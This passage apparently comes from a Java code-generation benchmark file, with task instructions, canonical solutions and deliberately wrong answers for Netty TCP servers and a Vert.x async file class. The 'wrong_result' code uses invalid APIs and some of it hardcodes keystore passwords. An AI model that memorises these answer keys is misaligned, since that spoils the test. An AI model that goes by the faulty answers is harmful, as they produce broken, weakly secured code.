    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class MyLineBasedFrameDecoderServer {\n\n    public static int DEFAULT_PORT = 8023;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public MyLineBasedFrameDecoderServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws Exception {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new MyLineBasedFrameDecoderChannelInitializer())\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"MyLineBasedFrameDecoderServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = DEFAULT_PORT;\n        MyLineBasedFrameDecoderServer server = new MyLineBasedFrameDecoderServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class MyLineBasedFrameDecoderServer {\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n    private static final int DEFAULT_PORT = 8023;\n\n    public MyLineBasedFrameDecoderServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n    }\n\n    public void start(int port) throws Exception {\n        bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new LineBasedFrameDecoder(8192));\n                        pipeline.addLast(new MyHandler());\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture future = bootstrap.bind(port).sync();\n        future.channel().closeFuture().sync();\n    }\n\n    public void shutdown() {\n        if (bootstrap != null) {\n            bootstrap.config().group().shutdownGracefully();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) {\n        MyLineBasedFrameDecoderServer server = new MyLineBasedFrameDecoderServer();\n        try {\n            server.start(DEFAULT_PORT);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static class MyHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            String line = (String) msg;\n            System.out.println(\"Received: \" + line);\n            ctx.fireChannelRead(msg);\n        }\n    }\n}"
  },
  {
    "Task_id": 18,
    "Instruction": "Task Description: Implement an asynchronous file handling class in Java using NIO's AsynchronousFileChannel for non-blocking file operations, supporting both reading and writing with various file opening options.\n\nClass Description: AsyncFileImpl is an implementation of AsyncFile interface that provides asynchronous file operations using Java NIO. It handles file reading, writing, and closing operations in a non-blocking manner, with support for various file opening modes and permissions.\n\nAttributes:\n- vertx: VertxInternal - The Vert.x instance for asynchronous operations\n- ch: AsynchronousFileChannel - The NIO asynchronous file channel\n- context: ContextInternal - The Vert.x context for operation execution\n- closed: boolean - Flag indicating if the file is closed\n- writePos: long - Current write position in the file\n- readBufferSize: int - Size of the read buffer (default 8192)\n- handler: Handler<Buffer> - Handler for read operations\n- endHandler: Handler<Void> - Handler for end of file operations\n- readPos: long - Current read position in the file\n- readLength: long - Maximum length to read (default Long.MAX_VALUE)\n\nMethods:\n- AsyncFileImpl(VertxInternal vertx, String path, OpenOptions options, ContextInternal context) -> [Constructor] - Initializes the file channel with specified path and options\n- close() -> Future<Void> - Closes the file channel and releases resources\n- read(Buffer buffer, int offset, long position, int length) -> Future<Buffer> - Reads data from file into buffer at specified position\n- write(Buffer buffer, long position) -> Future<Void> - Writes buffer content to file at specified position\n- doWrite(Buffer buffer, long position, Handler<AsyncResult<Void>> handler) -> void - Internal method for write operation\n- doWrite(ByteBuffer[] buffers, long position, Handler<AsyncResult<Void>> handler) -> void - Internal method for writing multiple buffers\n- doWrite(ByteBuffer buff, long position, long toWrite, Handler<AsyncResult<Void>> handler) -> void - Internal method for writing buffer content\n- writeInternal(ByteBuffer buff, long position, Handler<AsyncResult<Void>> handler) -> void - Core write implementation using CompletionHandler\n- doRead(Buffer writeBuff, int offset, ByteBuffer buff, long position, Promise<Buffer> promise) -> void - Internal method for read operation\n- check() -> void - Verifies if file is not closed\n- closeInternal(Promise<Void> handler) -> void - Internal method for closing the file channel",
    "Canonical_solution": "import io.vertx.core.AsyncResult;\nimport io.vertx.core.Future;\nimport io.vertx.core.Handler;\nimport io.vertx.core.Promise;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.internal.buffer.BufferInternal;\nimport io.vertx.core.file.AsyncFile;\nimport io.vertx.core.file.FileSystemException;\nimport io.vertx.core.file.OpenOptions;\nimport io.vertx.core.impl.Arguments;\nimport io.vertx.core.internal.ContextInternal;\nimport io.vertx.core.internal.VertxInternal;\nimport io.vertx.core.internal.logging.Logger;\nimport io.vertx.core.internal.logging.LoggerFactory;\nimport io.vertx.core.streams.impl.InboundBuffer;\n\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.AsynchronousFileChannel;\nimport java.nio.channels.CompletionHandler;\nimport java.nio.file.OpenOption;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.nio.file.attribute.FileAttribute;\nimport java.nio.file.attribute.PosixFilePermissions;\nimport java.util.HashSet;\nimport java.util.Objects;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class AsyncFileImpl implements AsyncFile {\n\n    private static final Logger log = LoggerFactory.getLogger(AsyncFile.class);\n\n    private final VertxInternal vertx;\n    private final AsynchronousFileChannel ch;\n    private final ContextInternal context;\n    private boolean closed;\n    private long writePos;\n    private int readBufferSize = 8192;\n    private Handler<Buffer> handler;\n    private Handler<Void> endHandler;\n    private long readPos;\n    private long readLength = Long.MAX_VALUE;\n\n    public AsyncFileImpl(VertxInternal vertx, String path, OpenOptions options, ContextInternal context) {\n        this.vertx = vertx;\n        Path file = Paths.get(path);\n        HashSet<OpenOption> opts = new HashSet<>();\n        if (options.isRead()) opts.add(StandardOpenOption.READ);\n        if (options.isWrite()) opts.add(StandardOpenOption.WRITE);\n        if (options.isCreate()) opts.add(StandardOpenOption.CREATE);\n        if (options.isCreateNew()) opts.add(StandardOpenOption.CREATE_NEW);\n        if (options.isSync()) opts.add(StandardOpenOption.SYNC);\n        if (options.isDsync()) opts.add(StandardOpenOption.DSYNC);\n        if (options.isDeleteOnClose()) opts.add(StandardOpenOption.DELETE_ON_CLOSE);\n        if (options.isSparse()) opts.add(StandardOpenOption.SPARSE);\n        if (options.isTruncateExisting()) opts.add(StandardOpenOption.TRUNCATE_EXISTING);\n        try {\n            if (options.getPerms() != null) {\n                FileAttribute<?> attrs = PosixFilePermissions.asFileAttribute(PosixFilePermissions.fromString(options.getPerms()));\n                ch = AsynchronousFileChannel.open(file, opts, vertx.getWorkerPool().executor(), attrs);\n            } else {\n                ch = AsynchronousFileChannel.open(file, opts, vertx.getWorkerPool().executor());\n            }\n            if (options.isAppend()) writePos = ch.size();\n        } catch (IOException e) {\n            throw new FileSystemException(e);\n        }\n        this.context = context;\n    }\n\n    @Override\n    public Future<Void> close() {\n        Promise<Void> promise = context.promise();\n        closeInternal(promise);\n        return promise.future();\n    }\n\n    @Override\n    public Future<Buffer> read(Buffer buffer, int offset, long position, int length) {\n        Promise<Buffer> promise = context.promise();\n        Objects.requireNonNull(buffer, \"buffer\");\n        Arguments.require(offset >= 0, \"offset must be >= 0\");\n        Arguments.require(position >= 0, \"position must be >= 0\");\n        Arguments.require(length >= 0, \"length must be >= 0\");\n        check();\n        ByteBuffer bb = ByteBuffer.allocate(length);\n        doRead(buffer, offset, bb, position, promise);\n        return promise.future();\n    }\n\n    @Override\n    public Future<Void> write(Buffer buffer, long position) {\n        Promise<Void> promise = context.promise();\n        doWrite(buffer, position, promise::handle);\n        return promise.future();\n    }\n\n    private void doWrite(Buffer buffer, long position, Handler<AsyncResult<Void>> handler) {\n        Objects.requireNonNull(buffer, \"buffer\");\n        Arguments.require(position >= 0, \"position must be >= 0\");\n        check();\n        ByteBuf buf = ((BufferInternal)buffer).getByteBuf();\n        if (buf.nioBufferCount() > 1) {\n            doWrite(buf.nioBuffers(), position, handler);\n        } else {\n            ByteBuffer bb = buf.nioBuffer();\n            doWrite(bb, position, bb.limit(), handler);\n        }\n    }\n\n    private void doWrite(ByteBuffer[] buffers, long position, Handler<AsyncResult<Void>> handler) {\n        AtomicInteger cnt = new AtomicInteger();\n        AtomicBoolean sentFailure = new AtomicBoolean();\n        for (ByteBuffer b: buffers) {\n            int limit = b.limit();\n            doWrite(b, position, limit, ar -> {\n                if (ar.succeeded()) {\n                    if (cnt.incrementAndGet() == buffers.length) {\n                        handler.handle(ar);\n                    }\n                } else {\n                    if (sentFailure.compareAndSet(false, true)) {\n                        handler.handle(ar);\n                    }\n                }\n            });\n            position += limit;\n        }\n    }\n\n    private void doWrite(ByteBuffer buff, long position, long toWrite, Handler<AsyncResult<Void>> handler) {\n        if (toWrite > 0) {\n            writeInternal(buff, position, handler);\n        } else {\n            handler.handle(Future.succeededFuture());\n        }\n    }\n\n    private void writeInternal(ByteBuffer buff, long position, Handler<AsyncResult<Void>> handler) {\n        ch.write(buff, position, null, new CompletionHandler<Integer, Object>() {\n            public void completed(Integer bytesWritten, Object attachment) {\n                long pos = position;\n                if (buff.hasRemaining()) {\n                    pos += bytesWritten;\n                    writeInternal(buff, pos, handler);\n                } else {\n                    context.runOnContext((v) -> {\n                        handler.handle(Future.succeededFuture());\n                    });\n                }\n            }\n\n            public void failed(Throwable exc, Object attachment) {\n                context.runOnContext((v) -> {\n                    handler.handle(Future.failedFuture(exc));\n                });\n            }\n        });\n    }\n\n    private void doRead(Buffer writeBuff, int offset, ByteBuffer buff, long position, Promise<Buffer> promise) {\n        ch.read(buff, position, null, new CompletionHandler<Integer, Object>() {\n            long pos = position;\n\n            private void done() {\n                buff.flip();\n                writeBuff.setBytes(offset, buff);\n                buff.compact();\n                promise.complete(writeBuff);\n            }\n\n            public void completed(Integer bytesRead, Object attachment) {\n                if (bytesRead == -1) {\n                    done();\n                } else if (buff.hasRemaining()) {\n                    pos += bytesRead;\n                    doRead(writeBuff, offset, buff, pos, promise);\n                } else {\n                    done();\n                }\n            }\n\n            public void failed(Throwable t, Object attachment) {\n                promise.fail(t);\n            }\n        });\n    }\n\n    private void check() {\n        if (closed) {\n            throw new IllegalStateException(\"File handle is closed\");\n        }\n    }\n\n    private void closeInternal(Promise<Void> handler) {\n        check();\n        closed = true;\n        context.<Void>executeBlockingInternal(() -> {\n            ch.close();\n            return null;\n        }).onComplete(handler);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class AsyncFileImpl implements AsyncFile {\n    private final VertxInternal vertx;\n    private final AsynchronousFileChannel ch;\n    private final ContextInternal context;\n    private boolean closed;\n    private long writePos;\n    private final int readBufferSize;\n    private final Handler<Buffer> handler;\n    private final Handler<Void> endHandler;\n    private long readPos;\n    private final long readLength;\n\n    public AsyncFileImpl(VertxInternal vertx, String path, OpenOptions options, ContextInternal context) {\n        this.vertx = vertx;\n        this.context = context;\n        this.readBufferSize = 8192;\n        this.handler = null;\n        this.endHandler = null;\n        this.readPos = 0;\n        this.readLength = Long.MAX_VALUE;\n        try {\n            this.ch = AsynchronousFileChannel.open(Paths.get(path), options.toOpenOption(), context.getEventLoop().getNow(), vertx.getFileSystem().getSelectorProvider());\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public Future<Void> close() {\n        if (closed) {\n            return Future.succeededFuture();\n        }\n        Promise<Void> promise = Promise.promise();\n        closeInternal(promise);\n        return promise.future();\n    }\n\n    private void closeInternal(Promise<Void> handler) {\n        if (closed) {\n            handler.complete();\n            return;\n        }\n        closed = true;\n        try {\n            ch.close();\n            handler.complete();\n        } catch (IOException e) {\n            handler.fail(e);\n        }\n    }\n\n    @Override\n    public Future<Buffer> read(Buffer buffer, int offset, long position, int length) {\n        if (closed) {\n            return Future.failedFuture(new IllegalStateException(\"File is closed\"));\n        }\n        check();\n        if (length == 0) {\n            return Future.succeededFuture(buffer);\n        }\n        int bufferSize = Math.min(length, readBufferSize);\n        ByteBuffer buff = buffer.asByteBuf().slice(offset, bufferSize).nioBuffer();\n        Promise<Buffer> promise = Promise.promise();\n        doRead(buffer, offset, buff, position, promise);\n        return promise.future();\n    }\n\n    private void doRead(Buffer writeBuff, int offset, ByteBuffer buff, long position, Promise<Buffer> promise) {\n        if (buff.remaining() == 0) {\n            promise.complete(writeBuff);\n            return;\n        }\n        ch.read(buff, position, context.getEventLoop().getNow(), (bytesRead, exc) -> {\n            if (exc != null) {\n                promise.fail(exc);\n                return;\n            }\n            if (bytesRead == -1) {\n                promise.complete(writeBuff);\n                if (endHandler != null) {\n                    endHandler.handle(null);\n                }\n                return;\n            }\n            if (bytesRead > 0) {\n                writeBuff.getBytes(offset, buff.array(), offset, bytesRead);\n                if (position + bytesRead < readLength) {\n                    doRead(writeBuff, offset + bytesRead, buff, position + bytesRead, promise);\n                } else {\n                    promise.complete(writeBuff);\n                }\n            }\n        });\n    }\n\n    @Override\n    public Future<Void> write(Buffer buffer, long position) {\n        if (closed) {\n            return Future.failedFuture(new IllegalStateException(\"File is closed\"));\n        }\n        check();\n        ByteBuffer buff = buffer.asByteBuf().nioBuffer();\n        Promise<Void> promise = Promise.promise();\n        doWrite(buff, position, promise);\n        return promise.future();\n    }\n\n    private void doWrite(ByteBuffer buff, long position, Handler<AsyncResult<Void>> handler) {\n        writeInternal(buff, position, handler);\n    }\n\n    private void writeInternal(ByteBuffer buff, long position, Handler<AsyncResult<Void>> handler) {\n        ch.write(buff, position, context.getEventLoop().getNow(), (bytesWritten, exc) -> {\n            if (exc != null) {\n                handler.handle(Future.failedFuture(exc));\n                return;\n            }\n            if (bytesWritten > 0) {\n                writePos += bytesWritten;\n                handler.handle(Future.succeededFuture());\n            } else {\n                handler.handle(Future.failedFuture(new IOException(\"No bytes written\")));\n            }\n        });\n    }\n\n    private void check() {\n        if (closed) {\n            throw new IllegalStateException(\"File is closed\");\n        }\n    }\n}"
  },
  {
    "Task_id": 180,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling Telnet connections with optional SSL encryption.\n\nClass Description: The TelnetServer class is a Netty-based TCP server implementation that listens for incoming Telnet connections. It supports optional SSL encryption and uses separate thread groups for connection acceptance and request processing. The server logs connection events and properly manages resources during shutdown.\n\nAttributes:\n- SSL: static final boolean - Flag indicating whether SSL encryption should be enabled (configured via system property)\n- PORT: static final int - The port number the server will bind to (configurable via system property, defaults to 8023 or 8992 for SSL)\n\nMethods:\n- start(): void - Starts the Telnet server, binds to the configured port, and begins accepting connections. Throws Exception if any error occurs during startup.\n  Input: None\n  Output: None (void)\n  Description: Initializes SSL context if enabled, creates event loop groups, configures server bootstrap with channel type and handlers, binds to port, and waits for server shutdown. Ensures proper resource cleanup during shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class TelnetServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8992\" : \"8023\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new TelnetServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class TelnetServer {\n    public static final boolean SSL = Boolean.getBoolean(\"ssl\");\n    public static final int PORT = Integer.getInteger(\"port\", SSL ? 8992 : 8023);\n\n    public void start() throws Exception {\n        SslContext sslContext = SSL ? SslContextBuilder.forServer(\"keystore.jks\", \"password\").build() : null;\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<Channel>() {\n                 @Override\n                 protected void initChannel(Channel ch) {\n                     if (SSL) {\n                         ch.pipeline().addLast(sslContext.newHandler(ch.alloc()));\n                     }\n                     ch.pipeline().addLast(new TelnetHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private static class TelnetHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            System.out.println(\"Client connected: \" + ctx.channel().remoteAddress());\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            System.out.println(\"Client disconnected: \" + ctx.channel().remoteAddress());\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            ctx.writeAndFlush(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static void main(String[] args) {\n        new TelnetServer().start();\n    }\n}"
  },
  {
    "Task_id": 182,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to echo back any received messages to clients.\n\nClass Description: The EchoServer class is a Netty-based TCP server that listens on a specified port and echoes back any data received from connected clients. It manages server lifecycle including startup, shutdown, and resource cleanup.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and distributes them to workerGroup\n- workerGroup: [NioEventLoopGroup] - Handles I/O operations for established connections\n- bootstrap: [ServerBootstrap] - Netty server configuration and management object\n- DEFAULT_PORT: [int] - Default port number (7) to use when no port is specified\n\nMethods:\n- EchoServer() -> [void] - Constructor that initializes bossGroup, workerGroup and bootstrap\n- start([int port]) -> [void] - Starts the server on specified port, configures channel pipeline and binds to port\n- shutdown() -> [void] - Gracefully shuts down the server and releases all resources\n- main([String[] args]) -> [void] - Entry point that parses command line arguments and starts the server",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class EchoServer {\n\n    public static int DEFAULT_PORT = 7;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public EchoServer() {\n        this.bossGroup = new NioEventLoopGroup();\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws InterruptedException {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new EchoServerHandler())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"EchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n        try {\n            port = Integer.parseInt(args[0]);\n        } catch (RuntimeException ex) {\n            port = DEFAULT_PORT;\n        }\n\n        EchoServer server = new EchoServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class EchoServer {\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n    private static final int DEFAULT_PORT = 7;\n\n    public EchoServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                     .channel(NioServerSocketChannel.class)\n                     .childHandler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         public void initChannel(SocketChannel ch) throws Exception {\n                             ch.pipeline().addLast(new EchoHandler());\n                         }\n                     });\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) {\n        int port = DEFAULT_PORT;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        EchoServer server = new EchoServer();\n        new Thread(() -> server.start(port)).start();\n    }\n\n    private static class EchoHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            ctx.write(msg);\n            ctx.flush();\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 183,
    "Instruction": "Task Description: Create a Java class that implements a secure TCP chat server using Netty framework, supporting SSL/TLS encryption for secure communication between clients and the server.\n\nClass Description: SecureChatServer is a Netty-based TCP server that listens for incoming client connections on a specified port, establishes secure SSL/TLS encrypted channels, and handles chat communication. The server uses a boss-worker thread model for efficient connection handling.\n\nAttributes:\nPORT: [static final int] - The port number on which the server listens for incoming connections, defaulting to 8992 if not specified via system property.\n\nMethods:\nstart: [start]() -> [void] - Initializes and starts the secure chat server. Creates a self-signed SSL certificate, configures Netty's event loop groups, sets up server bootstrap with SSL context and channel handlers, binds to the specified port, and maintains server operation until shutdown. Handles resource cleanup during shutdown.\n- Throws: Exception if any error occurs during server startup or operation",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class SecureChatServer {\n\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    public void start() throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        SslContext sslCtx = SslContext.newServerContext(ssc.certificate(), ssc.privateKey());\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new SecureChatServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class SecureChatServer {\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private ServerBootstrap bootstrap;\n\n    public void start() throws Exception {\n        // Generate self-signed certificate\n        KeyStore keyStore = KeyStore.getInstance(\"JKS\");\n        keyStore.load(null, null);\n\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair keyPair = keyGen.generateKeyPair();\n\n        // Add Bouncy Castle provider\n        Security.addProvider(new BouncyCastleProvider());\n\n        X500Name dn = new X500Name(\"CN=SecureChatServer\");\n        X509v3CertificateBuilder certGen = new X509v3CertificateBuilder(\n            dn,\n            BigInteger.valueOf(System.currentTimeMillis()),\n            Date.from(Instant.now()),\n            Date.from(Instant.now().plusSeconds(3600 * 24 * 365)),\n            dn,\n            SubjectPublicKeyInfo.create(keyPair.getPublic())\n        );\n\n        ContentSigner contentSigner = new JcaContentSignerBuilder(\"SHA256withRSA\").build(keyPair.getPrivate());\n        X509CertificateHolder certHolder = certGen.build(contentSigner);\n        X509Certificate certificate = new JcaX509CertificateConverter().setProvider(BouncyCastleProvider.PROVIDER_NAME).getCertificate(certHolder);\n\n        keyStore.setKeyEntry(\"server\", keyPair.getPrivate(), \"password\".toCharArray(), new Certificate[]{certificate});\n\n        KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());\n        kmf.init(keyStore, \"password\".toCharArray());\n\n        SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n        sslContext.init(kmf.getKeyManagers(), null, null);\n\n        // Configure the server\n        bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(\n                                new SslHandler(sslContext.getServerContext()),\n                                new ChatServerHandler()\n                        );\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 1024)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        // Bind and start to accept incoming connections\n        ChannelFuture future = bootstrap.bind(PORT).sync();\n        future.channel().closeFuture().sync();\n\n        // Shutdown\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    private static class ChatServerHandler extends ChannelInboundHandlerAdapter {\n        private final Set<Channel> clients = new HashSet<>();\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            clients.add(ctx.channel());\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            clients.remove(ctx.channel());\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            ByteBuf buf = (ByteBuf) msg;\n            byte[] data = new byte[buf.readableBytes()];\n            buf.readBytes(data);\n            String message = new String(data, Charset.defaultCharset());\n\n            // Broadcast message to all clients\n            for (Channel client : clients) {\n                client.writeAndFlush(message);\n            }\n\n            ReferenceCountUtil.release(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        SecureChatServer server = new SecureChatServer();\n        server.start();\n    }\n}"
  },
  {
    "Task_id": 185,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process TCP requests.\n\nClass Description: The AndroidControlServer class is a Netty-based TCP server that listens on a specified port, accepts incoming client connections, and processes TCP requests using a custom handler. It manages server resources and provides graceful shutdown capabilities.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and accepts them\n- workerGroup: [NioEventLoopGroup] - Processes the accepted connections' network traffic\n\nMethods:\n- listen: [listen(int port)] -> [void] - Starts the TCP server on the specified port, configures server options, and sets up the request handler pipeline. The method blocks until the server channel is closed.\n  - Input Parameters:\n    - port: [int] - The port number on which the server should listen\n  - Throws:\n    - InterruptedException - If the thread is interrupted while waiting for the server to shutdown",
